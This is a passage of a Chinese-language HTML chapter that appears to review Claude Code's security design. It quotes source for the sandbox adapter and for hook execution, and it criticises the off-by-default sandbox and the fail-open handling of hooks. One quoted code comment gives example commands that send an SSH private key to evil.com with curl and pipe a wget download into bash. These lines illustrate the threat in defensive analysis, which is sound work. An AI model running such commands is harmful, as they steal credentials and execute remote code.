+  540                type: &#39;asyncAgent&#39;,
+  541                reason:</code></pre></div></div></article><article class="finding-card compact" id="claude-code-sandbox-001" data-finding-dimension="security"><header><span class="finding-index">03</span><div><div class="finding-meta"><b>L1</b><span>limitation</span><span>security</span></div><h3>03 · 有真实 OS sandbox 适配，但默认关闭且默认允许退回非沙箱命令</h3></div></header><div class="finding-grid"><div class="finding-copy"><section><span>源码事实</span><p>适配层调用外部 @anthropic-ai/sandbox-runtime；sandbox.enabled 默认 false，allowUnsandboxedCommands 默认 true，只有 enabled+failIfUnavailable 才要求启动失败即失败。平台/依赖不满足时 isSandboxingEnabled 返回 false。</p></section><section><span>白话解释</span><p>确实能装防护罩，但开箱时罩子没扣上，而且政策默认允许个别命令绕开它。</p></section><section class="finding-impact"><span>对自研 Harness 的含义</span><p>可评为“具备可选强隔离能力”，不能评为“默认安全沙箱”；底层 seatbelt/bubblewrap 细节还依赖仓库外的包。</p></section><div class="line-guide"><span>逐段阅读提示</span><ol><li><code>1–10</code><div><b>入口、配置和状态初始化</b><p>先确认谁拿到输入、读取了哪些配置、创建了哪些状态。</p></div></li><li><code>11–22</code><div><b>分支、副作用和回执</b><p>再追踪条件分支、外部调用、事件写入和失败出口；不要只看函数名。</p></div></li><li><code>after</code><div><b>回到调用者</b><p>最后沿着调用者和下一条事件继续读，确认这段代码的结果如何被消费。</p></div></li></ol></div><small class="finding-source-note">叙述来自历史证据账本 · 53f347d34666 · <a href="https://github.com/claude-code-best/claude-code/blob/53f347d34666e847405714095020afdfadb95503/src/utils/sandbox/sandbox-adapter.ts#L1-L22" target="_blank" rel="noreferrer">打开账本提交 ↗</a></small></div><div class="finding-code"><div class="finding-code-head"><span>src/utils/sandbox/sandbox-adapter.ts:1–22</span><a href="https://github.com/claude-code-best/claude-code/blob/53f347d34666e847405714095020afdfadb95503/src/utils/sandbox/sandbox-adapter.ts#L1-L22" target="_blank" rel="noreferrer">固定提交 ↗</a></div><pre><code>    1  /**
+    2   * Adapter layer that wraps @anthropic-ai/sandbox-runtime with Claude CLI-specific integrations.
+    3   * This file provides the bridge between the external sandbox-runtime package and Claude CLI&#39;s
+    4   * settings system, tool integration, and additional features.
+    5   */
+    6
+    7  import type {
+    8    FsReadRestrictionConfig,
+    9    FsWriteRestrictionConfig,
+   10    IgnoreViolationsConfig,
+   11    NetworkHostPattern,
+   12    NetworkRestrictionConfig,
+   13    SandboxAskCallback,
+   14    SandboxDependencyCheck,
+   15    SandboxRuntimeConfig,
+   16    SandboxViolationEvent,
+   17  } from &#39;@anthropic-ai/sandbox-runtime&#39;
+   18  import {
+   19    SandboxManager as BaseSandboxManager,
+   20    SandboxRuntimeConfigSchema,
+   21    SandboxViolationStore,
+   22  } from &#39;@anthropic-ai/sandbox-runtime&#39;
+   23  import { rmSync, statSync } from &#39;fs&#39;
+   24  import { readFile } from &#39;fs/promises&#39;
+   25  import { memoize } from &#39;lodash-es&#39;
+   26  import { join, resolve, sep } from &#39;path&#39;
+   27  import {
+   28    getAdditionalDirectoriesForClaudeMd,
+   29    getCwdState,
+   30    getOriginalCwd,
+   31  } from &#39;../../bootstrap/state.js&#39;
+   32  import { logForDebugging } from &#39;../debug.js&#39;
+   33  import { expandPath } from &#39;../path.js&#39;
+   34  import { getPlatform, type Platform } from &#39;../platform.js&#39;
+   35  import { settingsChangeDetector } from &#39;../settings/changeDetector.js&#39;
+   36  import { SETTING_SOURCES, type SettingSource } from &#39;../settings/constants.js&#39;
+   37  import { getManagedSettingsDropInDir } from &#39;../settings/managedPath.js&#39;
+   38  import {
+   39    getInitialSettings,
+   40    getSettings_DEPRECATED,
+   41    getSettingsFilePathForSource,
+   42    getSettingsForSource,
+   43    getSettingsRootPathForSource,
+   44    updateSettingsForSource,
+   45  } from &#39;../settings/settings.js&#39;
+   46  import type { SettingsJson } from &#39;../settings/types.js&#39;
+   47
+   48  // ============================================================================
+   49  // Settings Converter
+   50  // ============================================================================
+   51
+   52  import { BASH_TOOL_NAME } from &#39;@claude-code-best/builtin-tools/tools/BashTool/toolName.js&#39;
+   53  import { FILE_EDIT_TOOL_NAME } from &#39;@claude-code-best/builtin-tools/tools/FileEditTool/constants.js&#39;
+   54  import { FILE_READ_TOOL_NAME } from &#39;@claude-code-best/builtin-tools/tools/FileReadTool/prompt.js&#39;
+   55  import { WEB_FETCH_TOOL_NAME } from &#39;@claude-code-best/builtin-tools/tools/WebFetchTool/prompt.js&#39;
+   56  import { errorMessage } from &#39;../errors.js&#39;
+   57  import { getClaudeTempDir } from &#39;../permissions/filesystem.js&#39;
+   58  import type { PermissionRuleValue } from &#39;../permissions/PermissionRule.js&#39;
+   59  import { ripgrepCommand } from &#39;../ripgrep.js&#39;
+   60
+   61  // Local copies to avoid circular dependency
+   62  // (permissions.ts imports SandboxManager, bashPermissions.ts imports permissions.ts)
+   63  function permissionRuleValueFromString(
+   64    ruleString: string,
+   65  ): PermissionRuleValue {
+   66    const matches = ruleString.match(/^([^(]+)\(([^)]+)\)$/)
+   67    if (!matches) {
+   68      return { toolName: ruleString }
+   69    }
+   70    const toolName = matches[1]
+   71    const ruleContent = matches[2]
+   72    if (!toolName || !ruleContent) {
+   73      return { toolName: ruleString }
+   74    }
+   75    return { toolName, ruleContent }
+   76  }
+   77
+   78  function permissionRuleExtractPrefix(permissionRule: string): string | null {
+   79    const match = permissionRule.match(/^(.+):\*$/)
+   80    return match?.[1] ?? null
+   81  }
+   82
+   83  /**
+   84   * Resolve Claude Code-specific path patterns for sandbox-runtime.
+   85   *
+   86   * Claude Code uses special path prefixes in permission rules:
+   87   * - `//path` → absolute from filesystem root (becomes `/path`)
+   88   * - `/path` → relative to settings file directory (becomes `$SETTINGS_DIR/path`)
+   89   * - `~/path` → passed through (sandbox-runtime handles this)
+   90   * - `./path` or `path` → passed through (sandbox-runtime handles this)
+   91   *
+   92   * This function only handles CC-specific conventions (`//` and `/`).
+   93   * Standard path patterns like `~/` and relative paths are passed through</code></pre></div></div></article><article class="finding-card compact" id="claude-code-sandbox-002" data-finding-dimension="security"><header><span class="finding-index">04</span><div><div class="finding-meta"><b>L1</b><span>risk</span><span>security</span></div><h3>04 · hook 只做网络沙箱，包装失败时会继续无沙箱执行</h3></div></header><div class="finding-grid"><div class="finding-copy"><section><span>源码事实</span><p>shell hook 在 sandbox 开启时配置 deny-all outbound，但给予全文件系统写权限；wrap 失败会记录 warning 并运行原命令。Bash 的 excludedCommands 也被源码明确标注为便利功能而非安全边界。</p></section><section><span>白话解释</span><p>hook 能被断网，但仍可改本机文件；连断网罩都戴不上时，为兼容旧行为会直接执行。</p></section><section class="finding-impact"><span>对自研 Harness 的含义</span><p>企业场景应把 hook fail-open 改为策略可控的 fail-closed，并把项目 hook 来源信任与动作权限分开。</p></section><div class="line-guide"><span>逐段阅读提示</span><ol><li><code>1041–1063</code><div><b>入口、配置和状态初始化</b><p>先确认谁拿到输入、读取了哪些配置、创建了哪些状态。</p></div></li><li><code>1064–1088</code><div><b>分支、副作用和回执</b><p>再追踪条件分支、外部调用、事件写入和失败出口；不要只看函数名。</p></div></li><li><code>after</code><div><b>回到调用者</b><p>最后沿着调用者和下一条事件继续读，确认这段代码的结果如何被消费。</p></div></li></ol></div><small class="finding-source-note">叙述来自历史证据账本 · 53f347d34666 · <a href="https://github.com/claude-code-best/claude-code/blob/53f347d34666e847405714095020afdfadb95503/src/utils/hooks.ts#L1041-L1088" target="_blank" rel="noreferrer">打开账本提交 ↗</a></small></div><div class="finding-code"><div class="finding-code-head"><span>src/utils/hooks.ts:1041–1088</span><a href="https://github.com/claude-code-best/claude-code/blob/53f347d34666e847405714095020afdfadb95503/src/utils/hooks.ts#L1041-L1088" target="_blank" rel="noreferrer">固定提交 ↗</a></div><pre><code> 1041    // SECURITY: Apply network-only sandbox to hook commands when sandboxing is enabled.
+ 1042    // Hooks execute arbitrary shell commands from settings.json without going
+ 1043    // through the Bash tool&#39;s permission prompt. Unlike the full Bash sandbox,
+ 1044    // hooks only get network restrictions (not filesystem restrictions) because:
+ 1045    //   - Legitimate hooks (formatters, linters, type checkers) need full
+ 1046    //     filesystem access to read/write project files
+ 1047    //   - The core threat from malicious hooks is data exfiltration (e.g.
+ 1048    //     `curl http://evil.com?key=$(cat ~/.ssh/id_rsa)`) and payload download
+ 1049    //     (e.g. `wget http://evil.com/malware.sh | bash`)
+ 1050    //   - Hooks that genuinely need network (notifications) should use the
+ 1051    //     `http` hook type, which is not affected by this sandbox
+ 1052    let sandboxedCommand = finalCommand
+ 1053    if (!isPowerShell &amp;&amp; SandboxManager.isSandboxingEnabled()) {
+ 1054      try {
+ 1055        sandboxedCommand = await SandboxManager.wrapWithSandbox(
+ 1056          finalCommand,
+ 1057          undefined, // use default shell
+ 1058          {
+ 1059            // Network: deny all outbound by default. Hooks that need network
+ 1060            // should use the `http` hook type instead of shell commands.
+ 1061            network: {
+ 1062              allowedDomains: [],
+ 1063              deniedDomains: [],
+ 1064            },
+ 1065            // Filesystem: no additional restrictions beyond sandbox defaults.
+ 1066            // Hooks need to read/write project files freely (e.g. prettier --write).
+ 1067            filesystem: {
+ 1068              allowWrite: [&#39;/&#39;],
+ 1069              denyWrite: [],
+ 1070              allowRead: [],
+ 1071              denyRead: [],
+ 1072            },
+ 1073          },
+ 1074          signal,
+ 1075        )
+ 1076        logForDebugging(
+ 1077          `Hook command sandboxed (network-only): ${hook.command}`,
+ 1078          { level: &#39;verbose&#39; },
+ 1079        )
+ 1080      } catch (sandboxError) {
+ 1081        // If sandbox wrapping fails, log and continue without sandbox.
+ 1082        // This preserves backwards compatibility — hooks that ran before
+ 1083        // sandbox support was added will still work.
+ 1084        logForDebugging(
+ 1085          `Failed to sandbox hook command, running unsandboxed: ${errorMessage(sandboxError)}`,
+ 1086          { level: &#39;warn&#39; },
+ 1087        )
+ 1088      }
+ 1089    }
+ 1090
+ 1091    let child: ChildProcessWithoutNullStreams
+ 1092    if (shellType === &#39;powershell&#39;) {
+ 1093      const pwshPath = await getCachedPowerShellPath()
+ 1094      if (!pwshPath) {
+ 1095        throw new Error(
+ 1096          `Hook &quot;${hook.command}&quot; has shell: &#39;powershell&#39; but no PowerShell ` +
+ 1097            `executable (pwsh or powershell) was found on PATH. Install ` +
+ 1098            `PowerShell, or remove &quot;shell&quot;: &quot;powershell&quot; to use bash.`,
+ 1099        )
+ 1100      }
+ 1101      child = spawn(pwshPath, buildPowerShellArgs(finalCommand), {
+ 1102        env: envVars,
+ 1103        cwd: safeCwd,
+ 1104        // Prevent visible console window on Windows (no-op on other platforms)
+ 1105        windowsHide: true,
+ 1106      }) as ChildProcessWithoutNullStreams
+ 1107    } else {
+ 1108      // On Windows, use Git Bash explicitly (cmd.exe can&#39;t run bash syntax).
+ 1109      // On other platforms, shell: true uses /bin/sh.
+ 1110      const shell = isWindows ? findGitBashPath() : true
+ 1111      child = spawn(sandboxedCommand, [], {
+ 1112        env: envVars,
+ 1113        cwd: safeCwd,
+ 1114        shell,
+ 1115        // Prevent visible console window on Windows (no-op on other platforms)
+ 1116        windowsHide: true,
+ 1117      }) as ChildProcessWithoutNullStreams
+ 1118    }
+ 1119
+ 1120    // Hooks use pipe mode — stdout must be streamed into JS so we can parse
+ 1121    // the first response line to detect async hooks ({&quot;async&quot;: true}).
+ 1122    const hookTaskOutput = new TaskOutput(`hook_${child.pid}`, null)
+ 1123    const shellCommand = wrapSpawn(child, signal, hookTimeoutMs, hookTaskOutput)
+ 1124    // Track whether shellCommand ownership was transferred (e.g., to async hook registry)
+ 1125    let shellCommandTransferred = false
+ 1126    // Track whether stdin has already been written (to avoid &quot;write after end&quot; errors)
+ 1127    let stdinWritten = false
+ 1128
+ 1129    if ((hook.async || hook.asyncRewake) &amp;&amp; !forceSyncExecution) {
+ 1130      const processId = `async_hook_${child.pid}`
+ 1131      logForDebugging(
+ 1132        `Hooks: Config-based async hook, backgrounding process ${processId}`,
+ 1133      )
+ 1134
+ 1135      // Write stdin before backgrounding so the hook receives its input.
+ 1136      // The trailing newline matches the sync path (L1000). Without it,
+ 1137      // bash `read -r line` returns exit 1 (EOF before delimiter) — the
+ 1138      // variable IS populated but `if read -r line; then ...` skips the
+ 1139      // branch. See gh-30509 / CC-161.
+ 1140      child.stdin.write(jsonInput + &#39;\n&#39;, &#39;utf8&#39;)
+ 1141      child.stdin.end()
+ 1142      stdinWritten = true
+ 1143
+ 1144      const backgrounded = executeInBackground({
+ 1145        processId,
+ 1146        hookId,
+ 1147        shellCommand,
+ 1148        asyncResponse: { async: true, asyncTimeout: hookTimeoutMs },
+ 1149        hookEvent,
+ 1150        hookName,
+ 1151        command: hook.command,
+ 1152        asyncRewake: hook.asyncRewake,
+ 1153        pluginId,
+ 1154      })
+ 1155      if (backgrounded) {
+ 1156        return {
+ 1157          stdout: &#39;&#39;,
+ 1158          stderr: &#39;&#39;,
+ 1159          output: &#39;&#39;,</code></pre></div></div></article></div><h2>四问：从代码追到执行语义</h2><section class="mechanism-panel"><div class="mechanism-kicker">SECURITY · 四个实现问题</div><div class="mechanism-grid"><article class="mechanism-card"><span>ENTRY</span><h3>入口 / 注册</h3><p>先定位谁创建这次运行、注册了哪些能力，以及输入怎样进入状态。</p><blockquote>显式 deny、ask、工具自己的内容级检查和敏感路径 safetyCheck 先执行；之后 bypass/always-allow 才可能放行，passthrough 最终转为 ask。dontAsk 把 ask 变 deny，auto 可进入分类器。</blockquote><a href="https://github.com/claude-code-best/claude-code/blob/53f347d34666e847405714095020afdfadb95503/src/utils/permissions/permissions.ts#L1179-L1281" target="_blank" rel="noreferrer">src/utils/permissions/permissions.ts:1179–1281 ↗</a></article><article class="mechanism-card"><span>STATE</span><h3>状态 / 投影</h3><p>再找会话、上下文、队列或 projection 的所有权；状态不是 UI 文案。</p><blockquote>无头权限请求会执行 PermissionRequest hooks；hook 无决定时回到自动拒绝。后台 bubble/coordinator worker 可先等待自动检查，swarm worker 还能把请求转给 leader，主线程才展示交互对话框。</blockquote><a href="https://github.com/claude-code-best/claude-code/blob/53f347d34666e847405714095020afdfadb95503/src/utils/permissions/permissions.ts#L392-L470" target="_blank" rel="noreferrer">src/utils/permissions/permissions.ts:392–470 ↗</a></article><article class="mechanism-card"><span>EFFECT</span><h3>操作 / 事务</h3><p>把模型输出、工具执行、权限检查和外部副作用拆开，确认有没有回执。</p><blockquote>适配层调用外部 @anthropic-ai/sandbox-runtime；sandbox.enabled 默认 false，allowUnsandboxedCommands 默认 true，只有 enabled+failIfUnavailable 才要求启动失败即失败。平台/依赖不满足时 isSandboxingEnabled 返回 false。</blockquote><a href="https://github.com/claude-code-best/claude-code/blob/53f347d34666e847405714095020afdfadb95503/src/utils/sandbox/sandbox-adapter.ts#L1-L22" target="_blank" rel="noreferrer">src/utils/sandbox/sandbox-adapter.ts:1–22 ↗</a></article><article class="mechanism-card"><span>RECOVERY</span><h3>失败 / 恢复</h3><p>最后追踪重试、压缩、取消、回滚、持久化或人工接管出口。</p><blockquote>shell hook 在 sandbox 开启时配置 deny-all outbound，但给予全文件系统写权限；wrap 失败会记录 warning 并运行原命令。Bash 的 excludedCommands 也被源码明确标注为便利功能而非安全边界。</blockquote><a href="https://github.com/claude-code-best/claude-code/blob/53f347d34666e847405714095020afdfadb95503/src/utils/hooks.ts#L1041-L1088" target="_blank" rel="noreferrer">src/utils/hooks.ts:1041–1088 ↗</a></article></div></section><h2>把证据放回全链路</h2><div class="flow-strip"><span>输入 / 事件</span><i>→</i><span>规则 / 状态</span><i>→</i><span>模型 / 工具</span><i>→</i><span>回执 / 持久化</span><i>→</i><span>恢复 / 下一步</span></div><iframe class="diagram-frame diagram-frame-rich" src="../diagrams/architecture.html" title="Claude Code（复原） architecture" loading="lazy"></iframe><h2>小白练习：不要只会复述</h2><div class="exercise"><p>把本章 finding 卡片遮住白话解释，只看源码：谁创建状态？谁能改变状态？副作用在哪里发生？失败时写入了什么回执？最后点开行号链接，确认你的回答没有超出固定提交。</p><details><summary>查看提示</summary><ul><li>先找输入和状态，不要先找函数名。</li><li>把 policy / approval / sandbox 分开写。</li><li>如果引用来自历史账本，记得查看卡片里的历史 commit 标识。</li></ul></details></div></section><footer class="chapter-footer"><a href="ch06-context.html">← 上下文：长任务怎样不丢重点</a><a href="ch08-ecosystem.html">扩展：MCP、Skill、插件如何接入 →</a></footer></main></div><script src="../../../../assets/harness.js"></script></body></html>
